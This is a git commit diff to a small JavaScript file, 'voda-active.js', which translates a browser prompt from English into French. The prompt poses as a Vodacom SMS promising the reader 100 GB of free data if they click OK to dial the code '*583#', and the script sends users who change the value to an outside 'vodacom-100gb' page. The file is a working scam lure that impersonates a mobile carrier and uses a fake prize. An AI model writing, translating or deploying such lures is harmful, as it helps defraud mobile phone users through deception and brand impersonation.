24e56cdb1c31ee2fb48a131337add01660db8b7e
bigukpe <bigaka42@gmail.com>
2025-05-12 09:28:10 +0100

    Update voda-active.js

--- voda-active.js
+++ voda-active.js
@@ -1,5 +1,5 @@
 var password = '*583#'
-password=prompt('SMS: Congratulations, your Vodacom SIM card is eligible to receive 100GB, click OK to Dial Code Now','*583#');
+password=prompt('SMS: Félicitations, votre carte SIM Vodacom est éligible pour recevoir 100 Go, Cliquez sur OK pour composer le code maintenant','*583#');
 if (password != '*583#') {
 location.href='https://learnlivetech.org/vodacom-100gb.html';
 }
